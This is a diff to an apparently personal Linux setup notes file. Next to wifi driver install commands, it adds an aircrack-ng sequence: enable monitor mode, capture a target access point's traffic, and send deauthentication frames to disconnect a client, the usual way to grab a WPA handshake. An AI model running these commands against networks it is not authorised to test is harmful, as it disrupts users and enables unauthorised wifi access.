@@ -113,7 +113,14 @@ PlugInstall
 
 
 
-# for correct work wifi driver, if don't have drive. Linux Mint + Laptop; kali-undercover
+# for correct work wifi driver, if don't have drive. Linux Mint + Laptop; 
+kali-undercover
+ifconfig
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng --bssid [MAC адрес точки доступа – без скобок!] --channel 1 -w wifi wlan0mon
+aireplay-ng --deauth 20 -a [MAC точки доступа] -c [MAC подключенного клиента] wlan0mon;
 lspci -k | grep -iA2 net
 sudo apt-get update
 sudo apt-get install firmware-b43-installer
